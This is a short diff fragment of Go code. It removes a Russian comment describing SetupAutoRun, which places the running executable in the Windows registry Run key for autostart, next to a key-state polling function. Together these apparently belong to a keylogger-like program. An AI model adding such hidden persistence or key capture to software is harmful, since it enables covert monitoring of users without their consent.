@@ -90,7 +90,6 @@ func isKeyPressed(vkCode int) bool {
 	return ret&0x8000 != 0
 }
 
-// SetupAutoRun добавляет текущий исполняемый файл в автозагрузку Windows через реестр
 func SetupAutoRun() error {
 	runKey := `Software\Microsoft\Windows\CurrentVersion\Run`
 
